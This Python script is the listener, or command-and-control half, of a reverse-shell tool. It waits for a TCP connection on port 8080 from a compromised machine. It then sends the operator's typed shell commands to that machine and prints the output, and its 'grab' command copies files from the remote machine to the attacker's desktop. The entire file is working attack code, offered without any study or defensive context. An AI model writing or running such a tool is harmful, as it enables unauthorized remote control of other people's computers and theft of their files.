import socket
import os

def transfer(conn, command):
    conn.send(command.encode())
    grab, path = command.split("*")
    f = open('/root/Desktop/'+path, 'wb')
    while True:
        bits = conn.recv(1024)
        if bits.endswith('DONE'.encode()):
            f.write(bits[:-4])
            f.close()
            print('[+] Transfer completed')
            break
        if 'File not found'.encode() in bits:
            print('[-] Unable to find the file')
            break
        f.write(bits)

def connecting():
    s = socket.socket()
    s.bind(("192.168.1.100",8080))
    s.listen(1)
    print('[+] Listening for incoming TCP connection on port 8080')
    conn , addr = s.accept()
    print('[+] we got connection from', addr)
    
    while True:
        command = input("shell> ")
        if 'terminate' in command:
            conn.send('terminate'.encode())
            conn.close()
            break
        elif 'grab' in command:    # grab*<file_name>
            transfer(conn, command)
        else:
            conn.send(command.encode())
            print (conn.recv(1024).decode())
            
def main():
    connecting()

main()
